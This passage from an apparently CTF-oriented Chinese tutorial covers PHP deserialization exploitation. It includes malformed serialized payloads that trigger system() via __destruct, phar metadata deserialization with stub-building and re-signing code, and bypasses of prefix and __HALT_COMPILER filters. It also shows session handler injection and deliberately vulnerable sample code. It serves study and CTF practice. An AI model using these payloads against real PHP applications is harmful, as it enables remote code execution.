class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;NoNoNo&quot;</span>);<br></code></pre></td></tr></table></figure><p>反序列化操作执行之后并没有立即执行<code>__destruct()</code>方法中的内容，而是抛出了异常导致<code>__destruct()</code>方法被跳过。但是我们可以修改序列化得到的字符串使得反序列化解析出错，导致<code>__destruct()</code>方法被提前执行。</p><p>正常情况下的序列化字符串应该是：</p><p><code>O:4:&quot;Test&quot;:1:&#123;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;</code></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//去掉一个大括号</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;args&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;whoami&quot;</span>;<br><br><span class="hljs-comment">//结尾加入多余数据</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;args&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-number">123</span>a&#125;<br></code></pre></td></tr></table></figure><h2 id="serialize-unserialize-x-x3D-x"><a href="#serialize-unserialize-x-x3D-x" class="headerlink" title="serialize(unserialize($x)) !&#x3D; $x"></a>serialize(unserialize($x)) !&#x3D; $x</h2><p>正常来说一个合法的反序列化字符串，在反序列化之后再次序列化所得到的结果应是一致的</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserializ/unserialize-14.png"></p><p>虽然在例子中没有AAA这个类，但是在反序列化 序列化过后得到的值依然为原来的值</p><p>var_dump的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class AAA&#123;</span><br><span class="hljs-comment">//    public $a = &#x27;1&#x27;;</span><br><span class="hljs-comment">//    public $b = &#x27;2&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//$raw = &#x27;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;1&quot;;s:1:&quot;b&quot;;s:1:&quot;2&quot;;&#125;&#x27;;</span><br><span class="hljs-comment">//echo var_dump(unserialize($raw));</span><br><span class="hljs-keyword">object</span>(AAA)<span class="hljs-comment">#1 (2) &#123;</span><br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;2&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$raw = &#x27;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;1&quot;;s:1:&quot;b&quot;;s:1:&quot;2&quot;;&#125;&#x27;;</span><br><span class="hljs-comment">//echo var_dump(unserialize($raw));</span><br><span class="hljs-keyword">object</span>(<span class="hljs-built_in">__PHP_Incomplete_Class</span>)<span class="hljs-comment">#1 (3) &#123;</span><br>  [<span class="hljs-string">&quot;__PHP_Incomplete_Class_Name&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;AAA&quot;</span><br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;2&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>var_dump后可以发现以下差异</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">1：所属类名称<br>对象所属类的名称由 AAA 变为了 __PHP__Incomplete_Class<br><br>2：__PHP_Incomplete_Class_Name 属性<br>__PHP_Incomplete_Class 对象中多包含了一个 __PHP_Incomplete_Class_Name 属性<br></code></pre></td></tr></table></figure><p>所以PHP在遇到不存在的类时，会把不存在的类转换成 __PHP_Incomplete_Class 这种特殊的类，并且将原始的类名存放在 __PHP_Incomplete_Class_Name 这个属性中。而 serialize() 在处理的时候会倒推回来，发现对象是 __PHP_Incomplete_Class 后，会序列化成 __PHP_Incomplete_Class_Name 的值为类名的类，<strong>同时将 __PHP_Incomplete_Class_Name 删除（属性个数减一）</strong></p><p>所以可以手动构造一个包含<code>__PHP__Incomplete_Class</code>的序列化字符串，因为是我们手动构造的，所以<code>__PHP_Incomplete_Class_Name</code>值为空，serialize找不到后会跳过，但是属性个数减一的步骤不会跳过，所以构成了<code>serialize(unserialize($x)) != $x</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserializ/unserialize-15.png"></p><blockquote><p>注意：若 __PHP_Incomplete_Class 对象中的属性个数为零，则 __PHP_Incomplete_Class 的序列化结果中的属性个数描述值也将为零</p></blockquote><h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><blockquote><p>众所周知，在利用反序列化漏洞的时候，一般是将序列化后的字符串传入<code>unserialize()</code>来利用。但是通过<code>phar</code>可以不依赖<code>unserialize()</code>直接进行反序列化操作</p></blockquote><p>Phar是PHP的压缩文档，是PHP中类似于JAR的一种打包文件。它可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行内部语句。在PHP 5.3或更高版本中默认开启</p><p>phar结构由4部分组成</p><p><strong>一：stub</strong></p><p>stub的基本结构：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。类似于Phar的文件头</p><p><strong>二：manifest</strong></p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里就是漏洞利用的关键点</p><p><strong>三：contents</strong></p><p>被压缩文件的内容</p><p><strong>四：signature</strong></p><p>签名，放在文件末尾</p><p>签证尾部的01代表md5加密，02代表sha1加密，04代表sha256加密，08代表sha512加密</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserializ/unserialize-11.png"></p><p>一个最基本的例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;test.phar&quot;</span>);   <span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();  <span class="hljs-comment">//开始缓冲Phar写操作</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);   <span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);  <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>(); <span class="hljs-comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserializ/unserialize-12.png"></p><p>php一大部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析phar文件时，都会将meta-data进行反序列化<br>受影响的函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">fileatime<br>filectime<br>file_exists<br>file_get_contents<br>file_put_contents<br>file<br>filegroup<br>fopen<br>fileinode<br>filemtime<br>fileowner<br>fileperms<br>is_dir<br>is_executable<br>is_file<br>is_link<br>is_readable<br>is_writable<br>is_writeable<br>parse_ini_file<br>copy<br>unlink<br>stat<br>readfile<br></code></pre></td></tr></table></figure><p>当我们修改文件的内容时，签名就会变得无效，这个时候需要重新计算签名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read()<br>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型和GBMB标识</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure><h2 id="phar绕过上传限制"><a href="#phar绕过上传限制" class="headerlink" title="phar绕过上传限制"></a>phar绕过上传限制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;test.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//添加任意的文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserializ/unserialize-13.png"></p><h2 id="绕过头部phar-x2F-x2F"><a href="#绕过头部phar-x2F-x2F" class="headerlink" title="绕过头部phar:&#x2F;&#x2F;"></a>绕过头部phar:&#x2F;&#x2F;</h2><p>如果题目限制了<code>phar://</code>不能出现在头几个字符，可以用<code>Bzip/Gzip</code>协议绕过</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^php|^file|^phar|^dict|^zip/i&quot;</span>,<span class="hljs-variable">$filename</span>)&#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=phar://test.phar</span><br><span class="hljs-comment">//即使用filter伪协议来进行绕过</span><br><br>compress.bzip2:<span class="hljs-comment">//phar:///test.phar/test.txt</span><br><span class="hljs-comment">//使用bzip2协议来进行绕过</span><br><br>compress.zlib:<span class="hljs-comment">//phar:///home/sx/test.phar/test.txt</span><br><span class="hljs-comment">//使用zlib协议进行绕过</span><br></code></pre></td></tr></table></figure><h2 id="绕过-HALT-COMPILER检测"><a href="#绕过-HALT-COMPILER检测" class="headerlink" title="绕过__HALT_COMPILER检测"></a>绕过__HALT_COMPILER检测</h2><p>在前面介绍stub时提到过，PHP通过<code>__HALT_COMPILER</code>来识别Phar文件，那么为了防止Phar反序列化的出现，可能就会对这个进行过滤</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/HALT_COMPILER/i&quot;</span>,<span class="hljs-variable">$Phar</span>)&#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>绕过方法一：</strong></p><p>将Phar文件的内容写到压缩包注释中，压缩为zip文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;phar.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;flag is here&#x27;</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>绕过方法二：</strong></p><p>将生成的Phar文件进行gzip压缩，压缩后同样也可以进行反序列化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gzip test.phar<br></code></pre></td></tr></table></figure><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><p>什么是session这里就不描述了，网上有很多文章可以参考</p><p>先了解下<code>PHP session</code>不同引擎的存储机制</p><p><code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的</p><p>session.serialize_handler定义的引擎共有三种：</p><table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 + 竖线 + 经过serialize()函数序列化处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值</td></tr><tr><td>php_serialize</td><td>经过serialize()函数序列化处理的数组</td></tr></tbody></table><p>当<code>php</code>和<code>php_serialize</code>这两个处理区混合起来使用，就会出现<code>session</code>反序列化漏洞。原因是<code>php_serialize</code>存储的反序列化字符可以引用<code>|</code>，如果这时候使用<code>php</code>处理器的格式取出<code>$_SESSION</code>的值，<code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞</p><h2 id="SESSION变量可控"><a href="#SESSION变量可控" class="headerlink" title="$_SESSION变量可控"></a>$_SESSION变量可控</h2><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//1.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;session&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><br><br><span class="hljs-comment">//2.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先在<code>1.php</code>传入<code>?session=lewiserii</code></p><p><code>session</code>的内容，因为1.php页面用的是<code>php_serialize</code>引擎，所以是序列化处理的数组的形式</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-1.png"></p><p>而2.php用的是<code>php</code>引擎，在可控点传入<code>|</code>+<code>序列化字符串</code>，然后再次访问2.php调用session值的时候会触发</p><p>传入<code>?session=|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:9:&quot;lewiserii&quot;;&#125;</code>后，文件中的值就变成了下图中的值</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-2.png"></p><p>再次访问2.php，发现成功反序列化，修改了<code>$name</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-3.png"></p><blockquote><p>总结：由于1.php是使用php_serialize引擎处理，因此只会把’|’当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。</p></blockquote><h2 id="SESSION变量不可控"><a href="#SESSION变量不可控" class="headerlink" title="$_SESSION变量不可控"></a>$_SESSION变量不可控</h2><p>当<code>$_SESSION</code>不能直接控制时，可以借助<code>PHP_SESSION_UPLOAD_PROGRESS</code>来完成反序列化</p><p>关于<code>PHP_SESSION_UPLOAD_PROGRESS</code>的介绍可以参考我的另一篇文章<a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93.html#session-upload-progress%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">session.upload_progress文件包含</a></p><p>这里用ctfshow的一道新春题的前半部分作例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;session.serialize_handler&quot;</span>, <span class="hljs-string">&quot;php&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$happy</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-variable">$happy</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$happy</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy=<span class="hljs-string">&quot;Happy_New_Year!!!&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;happy;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$funName</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;happy;<br>        &#125;<br><br><br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_New_</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$daniu</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$robot</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$notrobot</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_New_</span>;<br>    